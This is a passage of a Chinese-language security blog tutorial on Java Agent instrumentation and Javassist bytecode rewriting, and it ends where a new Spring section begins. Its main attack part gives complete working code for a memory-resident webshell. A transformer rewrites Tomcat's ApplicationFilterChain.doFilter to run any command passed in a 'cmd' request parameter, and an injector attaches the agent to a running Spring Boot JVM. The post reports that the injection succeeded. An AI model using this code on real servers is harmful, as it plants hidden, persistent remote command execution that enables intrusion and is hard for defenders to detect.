<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Hello World!</span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.java.agentmain.instrumentation.Java_Agent_agentmain_Instrumentation</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: Sleep_Hello</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.intellij.rt.execution.application.AppMainV2$<span class="number">1</span></span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.intellij.rt.execution.application.AppMainV2</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">加载类: com.intellij.rt.execution.application.AppMainV2$Agent</span><br><span class="line">是否可被修改: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>ClassFileTransformer接口中只有一个transform()方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器如Bootstrap ClassLoader，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className           完全限定类内部形式的类名称,格式如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个通过ASM修改后添加了防御代码的字节码byte数组。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">byte</span>[] transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[]              classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。</p>
<p>当存在多个转换器时，转换将由 transform 调用链组成。 也就是说，一个 transform 调用返回的 byte 数组将成为下一个调用的输入（通过 classfileBuffer 参数）。</p>
<p>转换将按以下顺序应用：</p>
<ul>
<li>不可重转换转换器</li>
<li>不可重转换本机转换器</li>
<li>可重转换转换器</li>
<li>可重转换本机转换器</li>
</ul>
<p>至于transformer中对字节码的具体操作，则需要使用到Javassisit类。在<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145#header-id-20">这篇文章</a>中，我已经介绍过了Javassist的用法。下面我就来修改一个正在运行JVM的字节码。</p>
<h5 id="修改目标JVM的Class字节码">修改目标JVM的Class字节码</h5>
<p>首先编写一个目标类com.sleep.hello.Sleep_Hello.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            hello();</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>编写一个agentmain-Agent</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">java_agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取目标JVM加载的全部类</span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;org.example.hello&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Hello_Transform</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(cls);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>继承ClassFileTransformer类编写一个transformer，修改对应类的字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加额外的类搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取目标类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.example.hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取目标方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置方法体</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//返回目标类字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有个坑就是药在resources目录的文件中添加</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.zbz.java_agent_agentmain</span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067911718-31db2331-40ef-401e-a8dc-bbdcd31b6a4d.png" alt=""></p>
<h3 id="Instrumentation的局限性">Instrumentation的局限性</h3>
<p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p>
<p>premain和agentmain两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p>
<p>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses方法，此方法有以下限制：</p>
<ol>
<li>新类和老类的父类必须相同</li>
<li>新类和老类实现的接口数也要相同，并且是相同的接口</li>
<li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li>
<li>新类和老类新增或删除的方法必须是private static/final修饰的</li>
<li>可以修改方法体</li>
</ol>
<h3 id="Agent内存马">Agent内存马</h3>
<p>现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。</p>
<p>这里我们以Spring Boot为例，来实现一个Agent内存马</p>
<h4 id="Spring-Boot中的Tomcat">Spring Boot中的Tomcat</h4>
<p>我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Context:<span class="number">20</span>, Context_Learn (com.example.spring_controller)</span><br><span class="line">...</span><br><span class="line">(org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1067</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">963</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">655</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">764</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到会按照责任链机制反复调用ApplicationFilterChain#doFilter()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>跟到internalDoFilter()方法中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                              ServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">    <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p>
<h4 id="利用Java-Agent实现Spring-Filter内存马">利用Java Agent实现Spring Filter内存马</h4>
<p>我们复用上面的agentmain-Agent，修改字节码的关键在于transformer()方法，因此我们重写该方法即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation.transformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置方法体</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//返回目标类字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Inject_Agent_Spring类如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent_Spring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            System.out.println(vmd.displayName());</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>启动一个简单的Spring Boot项目</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067977588-edc44af3-3c65-40c9-8754-b07f0fa6505f.png" alt=""></p>
<p>运行Inject_Agent_Spring类，在doFilter方法中注入恶意代码，成功执行<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067985294-d3ab1888-609b-4b3c-a4ca-05446a303b6c.png" alt=""></p>
<p>上面介绍到的javasist参考：<a target="_blank" rel="noopener" href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81-Instrumentation">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81-Instrumentation</a></p>
<h2 id="4-spring内存马">4.spring内存马</h2>
